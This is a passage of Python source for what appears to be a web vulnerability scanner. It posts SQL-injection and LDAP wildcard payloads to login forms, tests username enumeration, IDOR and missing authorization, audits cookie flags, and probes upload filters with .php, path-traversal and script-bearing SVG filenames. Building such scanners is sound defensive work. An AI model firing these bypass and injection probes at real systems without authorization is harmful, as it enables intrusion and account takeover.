                              "hidden": hidden_vals})
    for f in forms[:3]:
        users = [n for n, t in f["fields"].items()
                 if t in ("text", "search", "email", "username", "login", "user", "")]
        passes = [n for n, t in f["fields"].items() if t == "password"]
        if not users or not passes:
            continue
        submit = {n: "Login" for n, t in f["fields"].items()
                  if t in ("submit", "image", "button")}
        rnd = f"gashnouser{int(time.time()) % 100000}"
        # hidden fields (CSRF tokens etc.) go back AS-IS: clobber them and
        # the form gets rejected, silently neutering the test.
        base_data = {**{u: rnd for u in users[:1]},
                     **{p: "gashwrongpass" for p in passes[:1]},
                     **submit,
                     **{n: "1" for n in f["fields"] if n not in users[:1]
                        and n not in passes[:1] and n not in submit
                        and n not in f.get("hidden", {})},
                     **f.get("hidden", {})}
        rb = _post(session, f["action"], timeout, data=base_data)
        if not rb:
            continue
        blow = (rb.text or "").lower()
        if any(m in blow for m in LOGIN_OK):
            continue  # baseline already looks 'in' -> measurement unusable
        for u in users[:1]:
            for p in passes[:1]:
                for variant in ({"user": True}, {"pass": True}):
                    data = dict(base_data)
                    if "user" in variant:
                        data[u] = LOGIN_PAYLOADS[0]
                    else:
                        data[p] = LOGIN_PAYLOADS[1]
                    r = _post(session, f["action"], timeout, data=data)
                    if not r:
                        continue
                    low = (r.text or "").lower()
                    markers = [m for m in LOGIN_OK if m in low]
                    corroborate = (abs(len(r.text or "") - len(rb.text or "")) > 200
                                    or r.url != rb.url or r.status_code != rb.status_code)
                    # 2+ markers alone are enough; one marker needs backup
                    if len(markers) >= 2 or (markers and corroborate):
                        out.append(Finding(
                            title="Possible SQLi Auth Bypass (login)", severity="CRITICAL",
                            url=f["action"],
                            detail=f"Injection logged in ({', '.join(markers[:3])}); "
                                   "random user could not",
                            evidence=f"{u}={LOGIN_PAYLOADS[0][:20]}",
                            confidence="Medium",))
                        if verbose:
                            print(warn(f"    [!] SQLi login bypass: {f['action']}"))
                        break
                else:
                    continue
                break
    return out


@register_check("login-enum", "Login username enumeration differential", order=10, deep_only=True)
def test_login_enum(session, pages: dict, base: str, timeout: int,
                    verbose: bool = False) -> list[Finding]:
    """Same wrong password, existing-vs-random username. Different errors
    (or sizes) mean the app tells usernames apart — brute-force fuel.
    Deep only: failed logins touch lockout counters."""
    from urllib.parse import urljoin
    out: list[Finding] = []
    forms = []
    for purl, html in (pages or {}).items():
        for m in FORM_RE.finditer(html or ""):
            chunk, full = m.group(1), m.group(0)
            if "password" not in full.lower():
                continue
            am = ACTION_RE.search(full)
            action = urljoin(base + "/", (am.group(1) if am else "") or "/")
            mm = _method_re()
            method = (mm.search(full).group(1).upper() if mm.search(full) else "GET")
            if method != "POST":
                continue
            fields, hidden_vals = _login_fields(chunk)
            if any(t == "password" for t in fields.values()):
                forms.append({"action": action, "fields": fields,
                              "hidden": hidden_vals})
    for f in forms[:2]:
        users = [n for n, t in f["fields"].items()
                 if t in ("text", "search", "email", "username", "login", "user", "")]
        passes = [n for n, t in f["fields"].items() if t == "password"]
        if not users or not passes:
            continue
        submit = {n: "Login" for n, t in f["fields"].items()
                  if t in ("submit", "image", "button")}
        rnd = f"gashnouser{int(time.time()) % 100000}"

        def mk(uname: str) -> dict:
            return {**{u: uname for u in users[:1]},
                    **{p: "WrongPass123!" for p in passes[:1]},
                    **submit,
                    **{n: "1" for n in f["fields"] if n not in users[:1]
                       and n not in passes[:1] and n not in submit
                       and n not in f.get("hidden", {})},
                    **f.get("hidden", {})}

        ra = _post(session, f["action"], timeout, data=mk("admin"))
        rb = _post(session, f["action"], timeout, data=mk(rnd))
        if not ra or not rb:
            continue
        la = _scrub_hidden(ra.text or "", f.get("hidden", "")).lower()
        lb = _scrub_hidden(rb.text or "", f.get("hidden", "")).lower()
        if any(m in la for m in LOGIN_OK) or any(m in lb for m in LOGIN_OK):
            continue  # someone actually got in — not an enum signal
        uh_a = any(m in la for m in LOGIN_USER_HINTS)
        uh_b = any(m in lb for m in LOGIN_USER_HINTS)
        ph_a = any(m in la for m in LOGIN_PASS_HINTS)
        ph_b = any(m in lb for m in LOGIN_PASS_HINTS)
        if (uh_a or uh_b or ph_a or ph_b) and ((uh_a, ph_a) != (uh_b, ph_b)):
            out.append(Finding(
                title="Login username enumeration", severity="LOW",
                url=f["action"],
                detail="Existing vs random username get different errors; "
                       "usernames are enumerable",
                evidence="differential error text",
                confidence="Medium",))
        elif abs(len(la) - len(lb)) > 300:
            out.append(Finding(
                title="Login username enumeration", severity="LOW",
                url=f["action"],
                detail=f"Existing vs random username differ by "
                       f"{abs(len(la) - len(lb))}B (tokens scrubbed)",
                evidence=f"{len(la)}B vs {len(lb)}B",
                confidence="Low",))
        if verbose and out and out[-1].url == f["action"]:
            print(warn(f"    [!] Login user-enum: {f['action']}"))
    return out


LDAP_BYPASS_USERS = ["*", "admin*", "*)(", "*)(uid=*))("]


@register_check("ldap-injection", "LDAP wildcard auth bypass", order=10, deep_only=True)
def test_ldap_injection(session, pages: dict, base: str, timeout: int,
                        verbose: bool = False) -> list[Finding]:
    """LDAP wildcard probes on login forms: `*` as the username with a wrong
    password. A login trace means the filter is concatenated, not escaped.
    Deep only: even failed logins touch lockout counters."""
    from urllib.parse import urljoin
    out: list[Finding] = []
    forms = []
    for purl, html in (pages or {}).items():
        for m in FORM_RE.finditer(html or ""):
            chunk, full = m.group(1), m.group(0)
            if "password" not in full.lower():
                continue
            am = ACTION_RE.search(full)
            action = urljoin(base + "/", (am.group(1) if am else "") or "/")
            mm = _method_re()
            method = (mm.search(full).group(1).upper() if mm.search(full) else "GET")
            if method != "POST":
                continue
            fields, hidden_vals = _login_fields(chunk)
            if any(t == "password" for t in fields.values()):
                forms.append({"action": action, "fields": fields,
                              "hidden": hidden_vals})
    for f in forms[:2]:
        users = [n for n, t in f["fields"].items()
                 if t in ("text", "search", "email", "username", "login", "user", "")]
        passes = [n for n, t in f["fields"].items() if t == "password"]
        if not users or not passes:
            continue
        submit = {n: "Login" for n, t in f["fields"].items()
                  if t in ("submit", "image", "button")}
        for wild in LDAP_BYPASS_USERS:
            data = {**{u: wild for u in users[:1]},
                    **{p: "WrongPass123!" for p in passes[:1]},
                    **submit,
                    **{n: "1" for n in f["fields"] if n not in users[:1]
                       and n not in passes[:1] and n not in submit
                       and n not in f.get("hidden", {})},
                    **f.get("hidden", {})}
            r = _post(session, f["action"], timeout, data=data)
            if not r:
                continue
            low = (r.text or "").lower()
            markers = [m for m in LOGIN_OK if m in low]
            corroborate = (r.url != f["action"] or r.status_code in (301, 302))
            if len(markers) >= 2 or (markers and corroborate):
                out.append(Finding(
                    title="Possible LDAP injection (auth bypass)",
                    severity="CRITICAL",
                    url=f["action"],
                    detail=f"Wildcard username '{wild}' logged in "
                           f"({', '.join(markers[:3])})",
                    evidence=wild,
                    confidence="Medium",))
                if verbose:
                    print(warn(f"    [!] LDAP bypass: {f['action']}"))
                break
    return out


# ---------- 12. WAF fingerprint (passive) ----------

WAF_SIGNS = [
    ("Cloudflare", ["cf-ray", "cf-cache-status", "__cfduid", "cf_clearance",
                    "server: cloudflare", "cf-mitigated"]),
    ("AWS WAF/CloudFront", ["x-amz-cf-id", "x-amzn-requestid", "awselb", "awselb/2.0"]),
    ("Akamai", ["akamai", "x-akamai", "ak_bmsc", "bm_sv", "_abck"]),
    ("Imperva/Incapsula", ["incap_ses", "visid_incap", "x-cdn", "x-iinfo"]),
    ("Sucuri", ["x-sucuri-id", "x-sucuri-cache", "sucuri"]),
    ("F5 BIG-IP", ["bigipserver", "bigip", "x-waf-event", "f5-"]),
    ("Fortinet FortiWeb", ["fortiwaf", "fgts", "fortigate"]),
    ("Barracuda", ["barra_counteression", "barracuda"]),
    ("Wordfence", ["wfvt_", "wordfence", "wfwaf"]),
    ("ModSecurity", ["mod_security", "modsecurity", "x-waf-status"]),
    ("Azure WAF", ["x-azure-ref", "azure", "x-fd-"]),
    ("Google Cloud Armor", ["x-cloud-trace-context", "via: 1.1 google"]),
]


def detect_waf(headers: dict, cookie_names: list[str]) -> str | None:
    blob = " ".join(f"{k}: {v}" for k, v in (headers or {}).items()).lower()
    blob += " " + " ".join(cookie_names or []).lower()
    for name, marks in WAF_SIGNS:
        if any(m in blob for m in marks):
            return name
    return None


@register_check("waf-detect", "WAF fingerprint (passive note)", order=5)
def test_waf_detect(session, headers: dict, base: str,
                    verbose: bool = False) -> list[Finding]:
    """No requests: reads base headers + session cookies."""
    try:
        jar = getattr(session, "cookies", None)
        cnames = [c.name for c in list(jar)] if jar else []
    except Exception:
        cnames = []
    waf = detect_waf(headers or {}, cnames)
    if waf:
        if verbose:
            print(warn(f"    [i] WAF: {waf} — some findings may be masked"))
        return [Finding(
            title="WAF detected", severity="INFO",
            url=base + "/",
            detail=f"{waf} looks active; vulnerabilities behind the filter may be masked, "
                   "manual verification advised",
            evidence=waf,
            confidence="High",)]
    return []


# ---------- 10. IDOR query-param (?id=10 -> 11) ----------

@register_check("idor-param", "IDOR query parameter (id/user_id/uuid)", order=10)
def test_idor_param(session, urls: list[str], timeout: int,
                    verbose: bool = False, threads: int = 10,
                    session_b=None) -> list[Finding]:
    """Enumerable query identifiers: N -> N+1 differential (unguessable
    UUID/GUID/slug refs have no sibling and are covered by authz-matrix)."""
    from concurrent.futures import ThreadPoolExecutor
    from core.authz import extract_refs_from_url, sibling_url
    out: list[Finding] = []

    def _probe(u: str) -> Finding | None:
        refs = [r for r in extract_refs_from_url(u)
                if r.location == "query" and r.kind == "int"]
        for ref in refs[:2]:
            key, n = ref.name, ref.value
            sib = sibling_url(u, ref)
            if not sib:
                continue
            g1, g2 = _get(session, u, timeout), _get(session, sib, timeout)
            if not g1 or not g2:
                continue
            if g1[0] in (401, 403) or g2[0] in (401, 403):
                continue
            if g1[0] == 200 and g2[0] == 200:
                l1, l2 = len(g1[1] or ""), len(g2[1] or "")
                if _bodies_differ(g1[1], g2[1]):
                    if _cross_session_confirm(session_b, sib, g2[1], timeout):
                        if verbose:
                            print(warn(f"    [!] IDOR-param confirmed: {sib}"))
                        return Finding(
                            title="Confirmed IDOR / BOLA (cross-session)",
                            severity="CRITICAL",
                            url=sib,
                            detail=f"?{key}={n} -> ={int(n) + 1} readable by a second user "
                                   f"({l1}B vs {l2}B); object auth is missing",
                            evidence=f"{l1}B vs {l2}B",
                            confidence="High",
                            method="GET", param=key, location="query",
                            confirm="cross-session",)
                    if verbose:
                        print(warn(f"    [!] IDOR-param: {sib}"))
                    return Finding(
                        title="Possible IDOR / BOLA (single session)", severity="MEDIUM",
                        url=sib,
                        detail=f"?{key}={n} -> ={int(n) + 1} returned different data ({l1}B vs {l2}B), no auth; "
                               "measured in one session, confirm with two users",
                        evidence=f"{l1}B vs {l2}B",
                        confidence="Low",)
        return None

    targets = urls[:8]
    with ThreadPoolExecutor(max_workers=max(1, min(threads, len(targets) or 1))) as ex:
        for f in ex.map(_probe, targets):
            if f:
                out.append(f)
    return out


@register_check("authz-matrix", "Anonymous vs user authorization matrix", order=33)
def test_authz_matrix(session, pages: dict, base: str, timeout: int,
                      verbose: bool = False, session_b=None,
                      ctx: dict | None = None,
                      anon_session=None) -> list[Finding]:
    """Who can see what: anonymous vs user (vs user B) per endpoint.

    Runs after dir-brute (order 33) so found admin/API paths join the
    candidates. Anonymous uses a cookie-less session; the user session is
    the scan session. No admin session exists by design — privilege
    boundaries above the user stay "possible", never "confirmed".
    """
    from urllib.parse import urljoin
    from core.authz import (extract_refs_from_url, classify_auth_response,
                            matrix_rows, same_object, extract_ownership)
    from core.diff import canonical_json
    cands: list[tuple[str, list]] = []

    def _same(u: str) -> bool:
        try:
            return urlparse(u).hostname == urlparse(base).hostname
        except Exception:
            return False

    for html in (pages or {}).values():
        for m in re.findall(r'href=["\']([^"\']+)["\']', html or "", re.I):
            full = urljoin(base + "/", m)
            if not _same(full):
                continue
            refs = extract_refs_from_url(full)
            if refs and (full, refs) not in cands:
                cands.append((full, refs))
    for purl in (pages or {}):
        if "?" in purl and _same(purl):
            refs = extract_refs_from_url(purl)
            if refs and all(p != purl for p, _ in cands):
                cands.append((purl, refs))
    for u in list((ctx or {}).get("found_paths", []))[:10]:
        if not _same(u):
            continue
        pl = urlparse(u).path.lower()
        if any(k in pl for k in ("admin", "dashboard", "manage", "/api/")) \
                and all(p != u for p, _ in cands):
            cands.append((u, []))
    cands = cands[:6]
    if not cands:
        return []
    if anon_session is None:
        from core.scanner import _session as _mk_session
        try:
            anon_session = _mk_session(timeout)
        except Exception:
            return []
    anon = anon_session
    out: list[Finding] = []

    def _fetch(s, url: str):
        try:
            return _get(s, url, timeout)
        except Exception:
            return None

    for full, refs in cands:
        g_user, g_anon = _fetch(session, full), _fetch(anon, full)
        if not g_user or not g_anon:
            continue
        cu = classify_auth_response(g_user[0], g_user[1], g_user[2])
        ca = classify_auth_response(g_anon[0], g_anon[1], g_anon[2])
        issues = matrix_rows(full, {"anonymous": ca, "user": cu})
        if issues:
            kinds = ", ".join(sorted({r["issue"] for r in issues}))
            out.append(Finding(
                title="Missing authentication on object endpoint",
                severity="MEDIUM",
                url=full,
                detail=f"Sensitive endpoint answers 200 without a session "
                       f"({kinds}); anonymous and user sessions both get in",
                evidence="anon-200",
                confidence="High",
                method="GET", location="path", auth_context="anonymous",
                confirm="anon-200",))
            if verbose:
                print(warn(f"    [!] Missing auth: {full}"))
            continue
        anon_body = g_anon[1] or ""
        unguessable = [r for r in refs if r.kind in ("uuid", "guid", "slug")]
        if unguessable and ca == "ok":
            data = canonical_json(anon_body)
            has_data = isinstance(data, (dict, list)) and len(str(data)) > 10
            if (has_data or extract_ownership(anon_body)) and \
                    "login" not in anon_body[:2000].lower():
                out.append(Finding(
                    title="Direct object reference reachable anonymously",
                    severity="MEDIUM",
                    url=full,
                    detail=f"Unguessable {unguessable[0].kind} object returns "
                           "data without a session; object auth is missing",
                    evidence=unguessable[0].value[:40],
                    confidence="Medium",
                    method="GET", param=unguessable[0].name,
                    location=unguessable[0].location,
                    auth_context="anonymous", confirm="anon-200",))
                if verbose:
                    print(warn(f"    [!] Anon object access: {full}"))
                continue
        pl = urlparse(full).path.lower()
        if cu == "ok" and ca != "ok" and not refs and \
                any(k in pl for k in ("admin", "dashboard", "manage")):
            out.append(Finding(
                title="Possible missing authorization (admin surface)",
                severity="MEDIUM",
                url=full,
                detail="Authenticated session reaches an admin surface "
                       "anonymous cannot; without an admin session the "
                       "privilege boundary stays unproven",
                evidence="user-200",
                confidence="Medium",
                method="GET", location="path", auth_context="user",))
            if verbose:
                print(warn(f"    [!] Admin surface: {full}"))
            continue
        if session_b is not None and cu == "ok" and refs:
            g_b = _fetch(session_b, full)
            if g_b and g_b[0] == 200 and same_object(g_b[1], g_user[1]):
                data = canonical_json(g_user[1] or "")
                rich = isinstance(data, (dict, list)) and len(str(data)) > 10
                if rich or extract_ownership(g_user[1]):
                    out.append(Finding(
                        title="Confirmed IDOR / BOLA (cross-session)",
                        severity="CRITICAL",
                        url=full,
                        detail="Same object (canonical content match) readable "
                               "by a second user; object auth is missing",
                        evidence="canonical-match",
                        confidence="High",))
                    if verbose:
                        print(warn(f"    [!] IDOR confirmed (matrix): {full}"))
        if len(out) >= 4:
            break
    seen, uniq = set(), []
    for x in out:
        if (x.title, x.url) not in seen:
            seen.add((x.title, x.url))
            uniq.append(x)
    return uniq[:4]


# ---------- 11. Cookie flag audit ----------

@register_check("cookie-flags", "Cookie HttpOnly/Secure/SameSite audit", order=10)
def test_cookie_flags(session, base: str, timeout: int,
                      verbose: bool = False) -> list[Finding]:
    """Missing flags on session cookies. Passive, no extra requests (reads the jar)."""
    try:
        jar = getattr(session, "cookies", None)
        cookies = list(jar) if jar else []
    except Exception:
        return []
    out: list[Finding] = []
    https = base.startswith("https://")
    for c in cookies[:5]:
        rest = {k.lower(): v for k, v in
                (getattr(c, "_rest", None) or getattr(c, "rest", None) or {}).items()}
        missing = []
        if "httponly" not in rest:
            missing.append("HttpOnly")
        if https and not getattr(c, "secure", False):
            missing.append("Secure")
        if "samesite" not in rest:
            missing.append("SameSite")
        if missing:
            out.append(Finding(
                title="Weak cookie flags", severity="LOW",
                url=base + "/",
                detail=f"Cookie '{c.name}' is missing: {', '.join(missing)}",
                evidence=c.name,
                confidence="High",))
            if verbose:
                print(warn(f"    [!] Cookie: {c.name} -> {', '.join(missing)} missing"))
        # __Host-/__Secure- prefixes are a browser-enforced contract:
        # breaking it silently drops the cookie's protection.
        name = c.name or ""
        if name.startswith("__Host-") and (
                not getattr(c, "secure", False) or "/" not in
                str(getattr(c, "path", "/") or "/")):
            out.append(Finding(
                title="Weak cookie flags", severity="LOW",
                url=base + "/",
                detail=f"Cookie '{name}' uses the __Host- prefix without "
                       "Secure + Path=/ + host-only; browsers ignore the prefix",
                evidence=name,
                confidence="High",))
            if verbose:
                print(warn(f"    [!] Cookie prefix broken: {name}"))
        elif name.startswith("__Secure-") and https \
                and not getattr(c, "secure", False):
            out.append(Finding(
                title="Weak cookie flags", severity="LOW",
                url=base + "/",
                detail=f"Cookie '{name}' uses the __Secure- prefix without "
                       "the Secure flag",
                evidence=name,
                confidence="High",))
            if verbose:
                print(warn(f"    [!] Cookie prefix broken: {name}"))
    return out[:4]


# JSON/base64 upload field names worth probing (deep only, benign text).
UPLOAD_JSON_FIELDS = {"file", "upload", "image", "avatar", "photo",
                      "document", "attachment", "content", "data", "blob",
                      "picture", "media", "filedata", "imageData"}

_UPLOAD_URL_HINT = re.compile(r"upload|avatar|media|attach|image", re.I)


def discover_json_uploads(html: str, base: str) -> list[tuple[str, str]]:
    """API-style upload sinks: fetch/axios POSTs to upload-ish URLs.

    Returns [(url, field)] with a file-ish field name when one is nearby,
    else ("file",). Same-host only, capped at 4. Pure (no requests).
    """
    from urllib.parse import urljoin
    out: list[tuple[str, str]] = []
    body = html or ""
    for m in re.finditer(
            r'''(?:fetch|axios\.(?:post|put)|\\$\.(?:post|ajax))\s*\(\s*["']([^"']+)["']''',
            body, re.I):
        raw = m.group(1)
        if not _UPLOAD_URL_HINT.search(raw):
            continue
        full = urljoin(base + "/", raw).split("#")[0]
        try:
            if urlparse(full).hostname != urlparse(base).hostname:
                continue
        except Exception:
            continue
        window = body[max(0, m.start() - 200):m.end() + 400]
        field = "file"
        for fm in re.finditer(r'''["']([a-zA-Z_]\w{1,24})["']\s*:''', window):
            if fm.group(1).lower() in UPLOAD_JSON_FIELDS:
                field = fm.group(1)
                break
        if (full, field) not in out:
            out.append((full, field))
        if len(out) >= 4:
            break
    return out


def _upload_ok(resp) -> bool:
    """Accepted-signal shared by upload probes (2xx + ok-hint, no block)."""
    try:
        body = (resp.text or "")[:2000]
        return resp.status_code in (200, 201) \
            and bool(UPLOAD_OK_HINT.search(body)) \
            and not UPLOAD_BLOCK_HINT.search(body)
    except Exception:
        return False


def _json_upload_probes(session, html: str, base: str, timeout: int,
                        verbose: bool = False) -> list[Finding]:
    """JSON/base64 upload: benign text in, served file out (deep only)."""
    import base64
    out: list[Finding] = []
    marker = f"gashjson{int(time.time()) % 100000}"
    raw = f"GASH benign probe - not executable - {marker} - text only".encode()
    blob = base64.b64encode(raw).decode()
    for url, field in discover_json_uploads(html, base)[:2]:
        try:
            r = _post(session, url, timeout,
                      json={field: blob, "filename": "gash_probe.txt"})
        except ScanBudgetExceeded:
            raise
        except Exception:
            continue
        if not r or not _upload_ok(r):
            continue
        m = re.search(r'["\']([^"\']*(?:uploads?|files?|media|static)[^"\']*)["\']',
                      r.text or "", re.I)
        if not m:
            continue  # accepted, but no servable file disclosed: quiet
        from urllib.parse import urljoin as _uj
        try:
            g = _get(session, _uj(url + "/", m.group(1)), timeout)
        except ScanBudgetExceeded:
            raise
        except Exception:
            continue
        if g and marker in (g[1] or ""):
            if verbose:
                print(warn(f"    [!] Stored file via JSON upload: {url}"))
            out.append(Finding(
                title="Stored file via JSON upload", severity="CRITICAL",
                url=url,
                detail=f"Base64 field '{field}' is decoded and served back "
                       f"with our marker at {m.group(1)[:80]}",
                evidence=marker,
                confidence="Medium",))
            break
    return out


def _upload_mismatch_probe(session, endpoint: str, timeout: int,
                           content: bytes,
                           verbose: bool = False) -> list[Finding]:
    """.txt bytes as .png (and vice versa): is anything validated?"""
    try:
        r1 = _post(session, endpoint, timeout,
                   files={"file": ("gash_probe.png", content, "text/plain")},
                   data={"submit": "Upload"})
        r2 = _post(session, endpoint, timeout,
                   files={"file": ("gash_probe.txt", content, "image/png")},
                   data={"submit": "Upload"})
    except ScanBudgetExceeded:
        raise
    except Exception:
        return []
    if r1 and r2 and _upload_ok(r1) and _upload_ok(r2):
        if verbose:
            print(warn(f"    [!] Upload content-type not validated: {endpoint}"))
        return [Finding(
            title="Upload content-type not validated", severity="LOW",
            url=endpoint,
            detail="Same bytes accepted as .png/text-plain and as "
                   ".txt/image-png: neither extension nor content-type "
                   "is meaningfully validated",
            evidence="ext/ct-mismatch",
            confidence="Medium",)]
    return []


def _upload_filename_probe(session, endpoint: str, timeout: int,
                           content: bytes,
                           verbose: bool = False) -> list[Finding]:
    """Traversal-ish filename: does an escaped path come back?

    Benign text only; the claim is reflection of an escaped path, never
    filesystem access.
    """
    try:
        r = _post(session, endpoint, timeout,
                  files={"file": ("..%2F..%2Fgash_probe.txt", content,
                                  "text/plain")},
                  data={"submit": "Upload"})
    except ScanBudgetExceeded:
        raise
    except Exception:
        return []
    if not r or not _upload_ok(r):
        return []
    body = r.text or ""
    m = re.search(r'["\']([^"\']*\.\.[^"\']*)["\']', body)
    if m:
        if verbose:
            print(warn(f"    [!] Upload filename path reflection: {endpoint}"))
        return [Finding(
            title="Upload filename handling (path reflection)",
            severity="LOW",
            url=endpoint,
            detail=f"Traversal-style filename echoes back as a path "
                   f"({m.group(1)[:80]}); verify where it lands server-side",
            evidence="dotdot-path",
            confidence="Low",)]
    return []


@register_check("upload-rce", "Upload filter bypass (benign content, active POST)", order=15, deep_only=True)
def test_upload_rce(session, base: str, html: str, timeout: int,
                    verbose: bool = False, deep: bool = True) -> list[Finding]:
    """Active POST only in deep mode; content always harmless text."""
    if not deep:
        return []
    # find endpoints first: file inputs in forms, or known paths
    endpoints = []
    for m in FORM_RE.finditer(html or ""):
        if FILE_INPUT_HINT.search(m.group(0) or ""):
            am = ACTION_RE.search(m.group(0))
            from urllib.parse import urljoin
            endpoints.append(urljoin(base + "/", (am.group(1) if am else "") or "/"))
    for path in UPLOAD_PATHS:
        url = base + path
        got = _get(session, url, timeout)
        if got and got[0] == 200 and FILE_INPUT_HINT.search(got[1] or ""):
            endpoints.append(url)
    endpoints = list(dict.fromkeys(endpoints))[:3]
    if not endpoints:
        return []

    print(info(f"  [*] Trying upload filter bypass ({len(endpoints)} endpoints)..."))
    out: list[Finding] = []
    content = b"GASH benign probe - not executable - text only"
    svg_content = (b'<svg xmlns="http://www.w3.org/2000/svg">'
                   b'<script>/*gashsvgmarker*/</script></svg>')
    for ep in endpoints:
        results: dict[str, bool] = {}
        disclosed = ""
        for fname in UPLOAD_BYPASS_NAMES:
            body_bytes = svg_content if fname.endswith(".svg") else content
            r = _post(session, ep, timeout,
                      files={"file": (fname, body_bytes, "text/plain")},
                      data={"submit": "Upload"})
            if not r:
                results[fname] = False
                continue
            body = r.text or ""
            window = body[:2000]
            ok = r.status_code in (200, 201) and UPLOAD_OK_HINT.search(window) \
                and not UPLOAD_BLOCK_HINT.search(window)
            # did it leak an open file URL?
            m = re.search(r'["\']([^"\']*uploads?[^"\']*)["\']', body, re.I)
            if m:
                disclosed = m.group(1)
            results[fname] = bool(ok)
        ctrl = results.get("gash_probe.txt", False)
        php_direct = results.get("gash_probe.php", False)
        bypass_hit = [n for n in UPLOAD_BYPASS_NAMES[2:] if results.get(n)]
        if verbose:
            print(f"    {DIM}{ep} -> {results}{RESET}")
        if php_direct:
            out.append(Finding(
                title="Possible Unrestricted File Upload (confirmed)",
                severity="CRITICAL",
                url=ep,
                detail="Harmless text accepted as .php; code execution may be "
                       "possible (verify RCE manually)"
                       + (f" File URL: {disclosed}." if disclosed else ""),
                evidence="gash_probe.php",
                confidence="Medium",))
        elif bypass_hit:
            blocked_php = (" (plain .php is blocked)" if not php_direct else "")
            out.append(Finding(
                title="Upload Filter Bypass (RCE vector)", severity="CRITICAL",
                url=ep,
                detail="Harmless text accepted under these names: "
                       f"{', '.join(bypass_hit)}{blocked_php}."
                       + (f" File URL: {disclosed}." if disclosed else "") +
                       " Verify RCE manually",
                evidence=",".join(bypass_hit),
                confidence="Medium",))
        elif ctrl:
            out.append(Finding(
                title="Possible Unrestricted File Upload (confirmed)",
                severity="CRITICAL",
                url=ep,
                detail="Harmless .txt file accepted; extension filter missing/weak",
                evidence="gash_probe.txt",
                confidence="Medium",))
        # SVG proof: if the script-carrying file is served back unmodified,
        # the upload is not just accepted — it executes.
        if results.get("gash_probe.svg") and disclosed:
            from urllib.parse import urljoin as _uj
            try:
                g = _get(session, _uj(ep + "/", disclosed), timeout)
            except ScanBudgetExceeded:
                raise
            except Exception:
                g = None
            if g and "gashsvgmarker" in (g[1] or ""):
                if verbose:
                    print(warn(f"    [!] Stored XSS via SVG: {disclosed}"))
                out.append(Finding(
                    title="Possible Stored XSS (SVG upload)", severity="CRITICAL",
                    url=_uj(ep + "/", disclosed),
                    detail="Uploaded SVG with script content is served back "
                           "unmodified (marker reflected)",
                    evidence="gashsvgmarker",
                    confidence="High",))
    if endpoints:
        first = endpoints[0]
        out += _json_upload_probes(session, html, base, timeout, verbose)
        out += _upload_mismatch_probe(session, first, timeout, content,
                                      verbose)
        out += _upload_filename_probe(session, first, timeout, content,
                                      verbose)
    return out


# ---------- 8. Smart-tech fingerprint ----------

def smart_tech_paths(html: str, headers: dict) -> tuple[list[str], list[str]]:
    """(technologies, extra dir-brute paths). No requests, passive."""
    blob = ((html or "")[:6000] + " " + " ".join(
        f"{k}: {v}" for k, v in (headers or {}).items())).lower()
    techs = [t for t, marks in TECH_MARKERS if any(m in blob for m in marks)]
    extra: list[str] = []
    for t in techs:
        extra += SMART_PATHS.get(t, [])
    extra += SMART_PATHS["backup"][:6]  # backups probed everywhere
    return sorted(set(techs)), list(dict.fromkeys(extra))


@register_check("smart-tech", "Tech fingerprint + targeted paths", order=21)
def smart_tech(ctx: dict) -> list[Finding]:
    """Passive: writes techs + extra_paths into ctx. Makes no requests."""
    html, headers = ctx.get("html", ""), ctx.get("headers") or {}
    techs, extra = smart_tech_paths(html, headers)
    ctx["techs"] = techs
    ctx.setdefault("extra_paths", []).extend(x for x in extra
                                             if x not in ctx["extra_paths"])
    if ctx.get("verbose") and techs:
        print(info(f"    [i] Technology: {', '.join(techs)}"))
    return []
